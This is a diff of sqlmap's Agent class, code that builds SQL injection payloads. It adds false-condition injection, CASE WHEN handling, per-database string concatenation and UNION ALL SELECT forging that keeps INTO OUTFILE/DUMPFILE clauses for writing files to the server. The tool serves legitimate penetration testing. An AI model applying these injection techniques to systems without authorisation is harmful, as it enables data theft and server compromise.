@@ -5,8 +5,8 @@ $Id$
 
 This file is part of the sqlmap project, http://sqlmap.sourceforge.net.
 
-Copyright (c) 2006-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
-                        and Daniele Bellucci <daniele.bellucci@gmail.com>
+Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
+Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>
 
 sqlmap is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -47,28 +47,32 @@ class Agent:
         temp.stop      = randomStr(6)
 
 
-    def payload(self, place=None, parameter=None, value=None, newValue=None, negative=False):
+    def payload(self, place=None, parameter=None, value=None, newValue=None, negative=False, falseCond=False):
         """
         This method replaces the affected parameter with the SQL
         injection statement to request
         """
 
-        negValue = ""
-        retValue = ""
+        falseValue = ""
+        negValue   = ""
+        retValue   = ""
 
         if negative == True or conf.paramNegative == True:
             negValue = "-"
+        elif falseCond == True or conf.paramFalseCond == True:
+            randInt = randomInt()
+            falseValue = " AND %d=%d" % (randInt, randInt + 1)
 
         # After identifing the injectable parameter
         if kb.injPlace == "User-Agent":
             retValue = kb.injParameter.replace(kb.injParameter,
-                                               "%s%s" % (negValue, kb.injParameter + newValue))
+                                               "%s%s" % (negValue, kb.injParameter + falseValue + newValue))
         elif kb.injParameter:
             paramString = conf.parameters[kb.injPlace]
             paramDict = conf.paramDict[kb.injPlace]
             value = paramDict[kb.injParameter]
             retValue = paramString.replace("%s=%s" % (kb.injParameter, value),
-                                           "%s=%s%s" % (kb.injParameter, negValue, value + newValue))
+                                           "%s=%s%s" % (kb.injParameter, negValue, value + falseValue + newValue))
 
         # Before identifing the injectable parameter
         elif parameter == "User-Agent":
@@ -259,6 +263,7 @@ class Agent:
 
         fieldsSelectTop      = re.search("\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", query, re.I)
         fieldsSelectDistinct = re.search("\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", query, re.I)
+        fieldsSelectCase     = re.search("\ASELECT\s+(\(CASE WHEN\s+.+\s+END\))", query, re.I)
         fieldsSelectFrom     = re.search("\ASELECT\s+(.+?)\s+FROM\s+", query, re.I)
         fieldsSelect         = re.search("\ASELECT\s+(.*)", query, re.I)
         fieldsNoSelect       = query
@@ -267,6 +272,8 @@ class Agent:
             fieldsToCastStr = fieldsSelectTop.groups()[0]
         elif fieldsSelectDistinct:
             fieldsToCastStr = fieldsSelectDistinct.groups()[0]
+        elif fieldsSelectCase:
+            fieldsToCastStr = fieldsSelectCase.groups()[0]
         elif fieldsSelectFrom:
             fieldsToCastStr = fieldsSelectFrom.groups()[0]
         elif fieldsSelect:
@@ -281,10 +288,25 @@ class Agent:
         #if query.startswith("SELECT ") and "(SELECT " in query:
         #    fieldsSelectFrom = None
 
-        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsToCastList, fieldsToCastStr
+        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, fieldsToCastList, fieldsToCastStr
 
 
-    def concatQuery(self, query):
+    def simpleConcatQuery(self, query1, query2):
+        concatenatedQuery = ""
+
+        if kb.dbms == "MySQL":
+            concatenatedQuery = "CONCAT(%s,%s)" % (query1, query2)
+
+        elif kb.dbms in ( "PostgreSQL", "Oracle" ):
+            concatenatedQuery = "%s||%s" % (query1, query2)
+
+        elif kb.dbms == "Microsoft SQL Server":
+            concatenatedQuery = "%s+%s" % (query1, query2)
+
+        return concatenatedQuery
+
+
+    def concatQuery(self, query, unpack=True):
         """
         Take in input a query string and return its processed nulled,
         casted and concatenated query string.
@@ -310,54 +332,67 @@ class Agent:
         @rtype: C{str}
         """
 
-        concatQuery = ""
-        query       = query.replace(", ", ",")
+        if unpack == True:
+            concatenatedQuery = ""
+            query             = query.replace(", ", ",")
 
-        fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, _, fieldsToCastStr = self.getFields(query)
-        castedFields = self.nullCastConcatFields(fieldsToCastStr)
-        concatQuery  = query.replace(fieldsToCastStr, castedFields, 1)
+            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr = self.getFields(query)
+            castedFields      = self.nullCastConcatFields(fieldsToCastStr)
+            concatenatedQuery = query.replace(fieldsToCastStr, castedFields, 1)
+        else:
+            concatenatedQuery = query
+            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr = self.getFields(query)
 
         if kb.dbms == "MySQL":
-            if fieldsSelectFrom:
-                concatQuery = concatQuery.replace("SELECT ", "CONCAT('%s'," % temp.start, 1)
-                concatQuery = concatQuery.replace(" FROM ", ",'%s') FROM " % temp.stop, 1)
+            if fieldsSelectCase:
+                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % temp.start, 1)
+                concatenatedQuery += ",'%s')" % temp.stop
+            elif fieldsSelectFrom:
+                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % temp.start, 1)
+                concatenatedQuery = concatenatedQuery.replace(" FROM ", ",'%s') FROM " % temp.stop, 1)
             elif fieldsSelect:
-                concatQuery  = concatQuery.replace("SELECT ", "CONCAT('%s'," % temp.start, 1)
-                concatQuery += ",'%s')" % temp.stop
+                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % temp.start, 1)
+                concatenatedQuery += ",'%s')" % temp.stop
             elif fieldsNoSelect:
-                concatQuery = "CONCAT('%s',%s,'%s')" % (temp.start, concatQuery, temp.stop)
+                concatenatedQuery = "CONCAT('%s',%s,'%s')" % (temp.start, concatenatedQuery, temp.stop)
 
         elif kb.dbms in ( "PostgreSQL", "Oracle" ):
-            if fieldsSelectFrom:
-                concatQuery = concatQuery.replace("SELECT ", "'%s'||" % temp.start, 1)
-                concatQuery = concatQuery.replace(" FROM ", "||'%s' FROM " % temp.stop, 1)
+            if fieldsSelectCase:
+                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'||" % temp.start, 1)
+                concatenatedQuery += "||'%s'" % temp.stop
+            elif fieldsSelectFrom:
+                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % temp.start, 1)
+                concatenatedQuery = concatenatedQuery.replace(" FROM ", "||'%s' FROM " % temp.stop, 1)
             elif fieldsSelect:
-                concatQuery  = concatQuery.replace("SELECT ", "'%s'||" % temp.start, 1)
-                concatQuery += "||'%s'" % temp.stop
+                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'||" % temp.start, 1)
+                concatenatedQuery += "||'%s'" % temp.stop
             elif fieldsNoSelect:
-                concatQuery = "'%s'||%s||'%s'" % (temp.start, concatQuery, temp.stop)
+                concatenatedQuery = "'%s'||%s||'%s'" % (temp.start, concatenatedQuery, temp.stop)
 
-            if kb.dbms == "Oracle" and " FROM " not in concatQuery and ( fieldsSelect or fieldsNoSelect ):
-                concatQuery += " FROM DUAL"
+            if kb.dbms == "Oracle" and " FROM " not in concatenatedQuery and ( fieldsSelect or fieldsNoSelect ):
+                concatenatedQuery += " FROM DUAL"
 
         elif kb.dbms == "Microsoft SQL Server":
             if fieldsSelectTop:
-                topNum = re.search("\ASELECT\s+TOP\s+([\d]+)\s+", concatQuery, re.I).group(1)
-                concatQuery = concatQuery.replace("SELECT TOP %s " % topNum, "TOP %s '%s'+" % (topNum, temp.start), 1)
-                concatQuery = concatQuery.replace(" FROM ", "+'%s' FROM " % temp.stop, 1)
+                topNum = re.search("\ASELECT\s+TOP\s+([\d]+)\s+", concatenatedQuery, re.I).group(1)
+                concatenatedQuery = concatenatedQuery.replace("SELECT TOP %s " % topNum, "TOP %s '%s'+" % (topNum, temp.start), 1)
+                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % temp.stop, 1)
+            elif fieldsSelectCase:
+                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'+" % temp.start, 1)
+                concatenatedQuery += "+'%s'" % temp.stop
             elif fieldsSelectFrom:
-                concatQuery = concatQuery.replace("SELECT ", "'%s'+" % temp.start, 1)
-                concatQuery = concatQuery.replace(" FROM ", "+'%s' FROM " % temp.stop, 1)
+                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % temp.start, 1)
+                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % temp.stop, 1)
             elif fieldsSelect:
-                concatQuery  = concatQuery.replace("SELECT ", "'%s'+" % temp.start, 1)
-                concatQuery += "+'%s'" % temp.stop
+                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'+" % temp.start, 1)
+                concatenatedQuery += "+'%s'" % temp.stop
             elif fieldsNoSelect:
-                concatQuery = "'%s'+%s+'%s'" % (temp.start, concatQuery, temp.stop)
+                concatenatedQuery = "'%s'+%s+'%s'" % (temp.start, concatenatedQuery, temp.stop)
 
-        return concatQuery
+        return concatenatedQuery
 
 
-    def forgeInbandQuery(self, query, exprPosition=None):
+    def forgeInbandQuery(self, query, exprPosition=None, nullChar="NULL"):
         """
         Take in input an query (pseudo query) string and return its
         processed UNION ALL SELECT query.
@@ -398,6 +433,12 @@ class Agent:
         if not exprPosition:
             exprPosition = kb.unionPosition
 
+        intoRegExp = re.search("(\s+INTO (DUMP|OUT)FILE\s+\'(.+?)\')", query, re.I)
+
+        if intoRegExp:
+            intoRegExp = intoRegExp.group(1)
+            query = query[:query.index(intoRegExp)]
+
         if kb.dbms == "Oracle" and inbandQuery.endswith(" FROM DUAL"):
             inbandQuery = inbandQuery[:-len(" FROM DUAL")]
 
@@ -406,21 +447,24 @@ class Agent:
                 inbandQuery += ", "
 
             if element == exprPosition:
-                if " FROM " in query and not query.startswith("SELECT "):
+                if " FROM " in query and not query.startswith("SELECT ") and "(CASE WHEN (" not in query:
                     conditionIndex = query.index(" FROM ")
                     inbandQuery += query[:conditionIndex]
                 else:
                     inbandQuery += query
             else:
-                inbandQuery += "NULL"
+                inbandQuery += nullChar
 
-        if " FROM " in query and not query.startswith("SELECT "):
+        if " FROM " in query and not query.startswith("SELECT ") and "(CASE WHEN (" not in query:
             conditionIndex = query.index(" FROM ")
             inbandQuery += query[conditionIndex:]
 
         if kb.dbms == "Oracle":
             if " FROM " not in inbandQuery:
                 inbandQuery += " FROM DUAL"
+
+        if intoRegExp:
+            inbandQuery += intoRegExp
 
         inbandQuery = self.postfixQuery(inbandQuery, kb.unionComment)
 
